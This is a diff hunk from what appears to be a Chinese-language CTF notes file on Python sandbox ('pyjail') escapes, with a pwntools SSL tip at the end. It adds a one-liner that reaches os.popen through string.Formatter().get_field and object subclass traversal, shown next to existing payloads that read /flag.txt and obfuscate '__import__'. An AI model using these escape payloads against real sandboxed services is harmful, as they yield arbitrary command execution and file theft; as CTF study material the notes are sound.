@@ -434,6 +434,7 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
                 .replace("\n", "\r")
       ```
     - `[print(y('/flag.txt').read()) for x,y in enumerate(string.Formatter().get_field('a.__self__.open', [], {'a': repr})) if x==0]`
+    - `print(string.Formatter().get_field("a.__init__.__globals__[sys]", [], kwargs={"a":string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], kwargs={"a":[]})[0]().pop(107)})[0].modules.pop('os').popen('cmd').read())`
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 
 ```python
